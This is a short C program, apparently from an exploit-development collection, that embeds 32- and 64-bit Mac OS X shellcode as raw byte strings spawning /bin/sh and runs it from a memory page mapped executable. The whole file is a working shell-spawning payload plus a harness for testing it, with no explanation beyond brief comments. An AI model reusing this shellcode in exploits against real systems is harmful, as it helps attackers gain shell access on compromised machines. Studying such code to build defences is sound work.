/* shellcode.c
 * 32- and 64-bit shellcode.
 * Tested on Mac OS X 10.6.8
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>

int (*sc)();

#ifdef __i386__
char shellcode[] =
	"\xeb\x0c\x5b\x31\xc0\x50\x50\x53\xb0\x3b\x50\xcd\x80\xc3\xe8\xef"
	"\xff\xff\xff/bin/sh";
#endif

#ifdef __x86_64__
char shellcode[] =
	"\xeb\x15\x5f\x48\x31\xc0\xb0\x02\x48\xc1\xe0\x18\x04\x3b\x48\x31"
	"\xf6\x48\x31\xd2\x0f\x05\xc3\xe8\xe6\xff\xff\xff/bin/sh";
#endif

int main(int argc, char **argv) {
	printf("Length of shellcode: %li\n", strlen(shellcode));

	/* OS X 64-bit executables have a non-executable stack, so we need to mmap
	 * it with PROT_EXEC.
	 *
	 * http://thexploit.com/secdev/testing-your-shellcode-on-a-non-executable-stack-or-heap/
	 */
	void *ptr = mmap(0, sizeof(shellcode),
		PROT_EXEC | PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE,
		-1, 0);

	if (ptr == MAP_FAILED) {
		perror("mmap");
		exit(-1);
	}

	memcpy(ptr, shellcode, sizeof(shellcode));
	sc = ptr;

	sc();

	return 0;
}

